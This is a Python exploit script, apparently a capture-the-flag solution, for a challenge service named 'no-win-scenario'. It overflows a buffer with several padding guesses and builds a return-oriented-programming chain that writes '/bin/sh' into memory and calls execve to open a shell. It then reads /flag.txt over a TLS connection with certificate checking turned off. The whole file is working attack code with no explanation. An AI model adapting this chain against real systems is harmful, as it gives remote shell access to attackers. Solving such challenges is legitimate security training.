import socket
import ssl
import struct
import time

def p64(addr):
    return struct.pack('<Q', addr)

def solve():
    host = 'no-win-scenario-23157edb6c2a.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    pop_rdi_rbp = 0x402128
    pop_rsi_rbp = 0x40a3c2
    pop_rdx = 0x413210
    pop_rax = 0x427eeb
    mov_rdx_rax = 0x40ff98
    syscall = 0x401324
    
    data_sec = 0x4aa0c0 + 0x80
    binsh = b"/bin/sh\x00"

    for pad in [64, 72, 80]:
        print(f"Trying padding {pad}")
        payload = b"A" * pad
        
        # Write /bin/sh to .data
        payload += p64(pop_rdx)
        payload += p64(data_sec)
        payload += p64(pop_rax)
        payload += binsh
        payload += p64(mov_rdx_rax)
        
        # Write NULL to .data + 8 just to be sure!
        payload += p64(pop_rdx)
        payload += p64(data_sec + 8)
        payload += p64(pop_rax)
        payload += p64(0)
        payload += p64(mov_rdx_rax)
        
        # Write NULL to .data + 16 just to be sure!
        payload += p64(pop_rdx)
        payload += p64(data_sec + 16)
        payload += p64(pop_rax)
        payload += p64(0)
        payload += p64(mov_rdx_rax)

        # Call execve
        payload += p64(pop_rdi_rbp)
        payload += p64(data_sec)
        payload += p64(0x0) # dummy rbp
        
        payload += p64(pop_rsi_rbp)
        payload += p64(data_sec + 8) # pointer to NULL
        payload += p64(0x0) # dummy rbp
        
        payload += p64(pop_rdx)
        payload += p64(data_sec + 16) # pointer to NULL
        
        payload += p64(pop_rax)
        payload += p64(59)
        
        payload += p64(syscall)
        
        # pad to 512 bytes?
        payload = payload.ljust(512, b"B")

        try:
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.recv(1024)
                    
                    ssock.sendall(payload)
                    time.sleep(1)
                    
                    ssock.sendall(b"cat /flag.txt\n")
                    time.sleep(1)
                    
                    resp = ssock.recv(4096).decode(errors='ignore')
                    if "NNS{" in resp:
                        print("Found flag!")
                        print(resp)
                        return
        except Exception as e:
            pass

if __name__ == "__main__":
    solve()
